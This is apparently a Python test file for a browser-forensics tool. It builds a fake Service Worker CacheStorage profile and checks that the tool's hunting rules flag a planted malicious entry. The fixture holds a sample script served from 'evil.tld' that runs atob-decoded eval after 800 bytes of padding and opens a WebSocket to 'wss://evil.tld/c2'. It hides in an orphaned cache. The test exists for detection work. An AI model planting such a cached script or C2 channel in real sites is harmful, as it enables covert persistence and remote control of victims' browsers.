"""End-to-end: build a real on-disk CacheStorage tree + a Service Worker
registration DB, deep-extract, and hunt. Proves native parser + extractor +
registration correlation + hunting engine work together, no browser needed.
"""
import sys, pathlib, os, tempfile, zlib
sys.path.insert(0, str(pathlib.Path(__file__).resolve().parents[1] / "src"))

from flotsam.simplecache import INITIAL_MAGIC, FINAL_MAGIC, HEADER, EOF
from flotsam.extract import deep_extract
from flotsam.hunt import hunt
from flotsam.models import Verdict


def _entry(key: bytes, body: bytes, meta: bytes) -> bytes:
    out = bytearray()
    out += HEADER.pack(INITIAL_MAGIC, 5, len(key), 0)
    out += key + body
    out += EOF.pack(FINAL_MAGIC, 0, zlib.crc32(body) & 0xffffffff, len(body))
    out += meta
    out += EOF.pack(FINAL_MAGIC, 0, zlib.crc32(meta) & 0xffffffff, len(meta))
    return bytes(out)


CT = b"\x00HTTP/1.1 200 OK\x00Content-Type: application/javascript\x00"


def _build_profile(root: str) -> None:
    cs = os.path.join(root, "Service Worker", "CacheStorage", "abcd1234")
    os.makedirs(os.path.join(cs, "g-evil"))
    os.makedirs(os.path.join(cs, "g-ok"))
    open(os.path.join(cs, "index.txt"), "w").write("g-ok\n")  # g-evil orphaned
    # several benign same-origin entries so the modal origin is unambiguous
    for i, res in enumerate(["app.js", "vendor.js", "ui.js"]):
        open(os.path.join(cs, "g-ok", f"1111111111{i:06d}_0"), "wb").write(
            _entry(f"_dk_https://site.example https://site.example https://site.example/{res}".encode(),
                   b"export const v=1;", CT))
    # attacker: cross-origin, obfuscated-ish, with live C2 — in an orphaned cache
    open(os.path.join(cs, "g-evil", "2222222222222222_0"), "wb").write(
        _entry(b"_dk_https://site.example https://site.example https://evil.tld/x.js",
               b"/*" + b"A" * 800 + b"*/ var p=atob('bWFsd2FyZQ==');eval(p);"
               b"new WebSocket('wss://evil.tld/c2');", CT))
    # a Service Worker registration DB naming the legit worker script
    db = os.path.join(root, "Service Worker", "Database")
    os.makedirs(db)
    open(os.path.join(db, "000003.log"), "wb").write(
        b"REG\x00https://site.example\x00https://site.example/app.js\x00scope\x00")


def test_deep_extract_hunt_and_correlate():
    with tempfile.TemporaryDirectory() as root:
        _build_profile(root)
        inv = deep_extract(root)
        urls = [e.request_url for o in inv.origins for c in o.caches for e in c.entries]
        assert "https://evil.tld/x.js" in urls, urls
        # registration recovered from the LevelDB-style log
        assert any(r.script_url == "https://site.example/app.js"
                   for r in inv.registrations), inv.registrations
        res = hunt(inv)
        assert res.verdict is Verdict.COMPROMISED, res.stats
        rules = {f.rule for f in res.findings}
        # full-body signature past 800 bytes of padding must still fire
        assert "dynamic-eval" in rules, rules
        assert "orphaned-cache" in rules, rules
        assert "cross-origin-entry" in rules, rules
        # registered script that is cached must be correlated
        assert "registered-script-cached" in rules or "active-persistence" in rules, rules


if __name__ == "__main__":
    test_deep_extract_hunt_and_correlate()
    print("ok  test_deep_extract_hunt_and_correlate")
    print("all extract tests passed")
